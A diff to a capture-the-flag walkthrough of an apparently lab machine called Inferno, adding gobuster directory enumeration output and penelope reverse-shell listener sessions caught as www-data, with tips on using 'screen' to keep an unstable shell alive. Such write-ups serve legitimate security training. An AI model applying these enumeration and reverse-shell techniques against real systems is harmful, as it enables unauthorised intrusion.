@@ -322,12 +322,27 @@ Now, let's see what we have on the website at port 80.
 Nothing that interesting, let's try gobuster.
 
 ```bash
-kali@kali:
-
-
-
-
-
+kali@kali:gobuster dir -u http://10.49.186.74 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.49.186.74
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+inferno              (Status: 401) [Size: 459]
+Progress: 87662 / 87662 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
 
 So, let's see in /inferno as it has 401 status code.
 
@@ -397,7 +412,43 @@ kali@kali:penelope -p 4445
 www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$
 ```
 
-We have a shell as www-data.
+We have a shell as www-data. 
+
+```bash
+penelope -p 4445
+[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from ip-10-49-186-74~10.49.186.74-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully using /usr/bin/python3! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Logging to /home/kali/.penelope/sessions/ip-10-49-186-74~10.49.186.74-Linux-x86_64/2026_02_16-15_58_41-139.log 📜
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$ exit
+[-] Session [1] died... We lost ip-10-49-186-74~10.49.186.74-Linux-x86_64 💔
+```
+
+Our session dies in every 1 minute or so. So, type "*screen*" command to stabilize ourselves.
+
+```bash
+kali@kali:penelope -p 4445
+[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from ip-10-49-186-74~10.49.186.74-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Attempting to upgrade shell to PTY...
+[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
+[+] Attempting to spawn a reverse shell on 192.168.130.26:4445
+[+] Got reverse shell from ip-10-49-186-74~10.49.186.74-Linux-x86_64 😍 Assigned SessionID <2>
+[+] Shell upgraded successfully using /usr/bin/script! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Logging to /home/kali/.penelope/sessions/ip-10-49-186-74~10.49.186.74-Linux-x86_64/2026_02_16-16_02_43-481.log 📜
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$ screen
+[screen is terminating]
+www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$ 
+```
+
+After screen get's terminated, again type "*screen*", so that next termination, we don't get kicked out. Perform this until, we find another pivot.
 
 After some time roaming here and there, I found .download.dat at dante's Downloads directory.
 
@@ -477,7 +528,7 @@ Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
 dante@ip-10-49-186-74:~$ 
 ```
 
-First flag is at dante's home directory.
+First flag is at dante's home directory. 
 
 ```bash
 dante@ip-10-49-186-74:~$ cat local.txt 
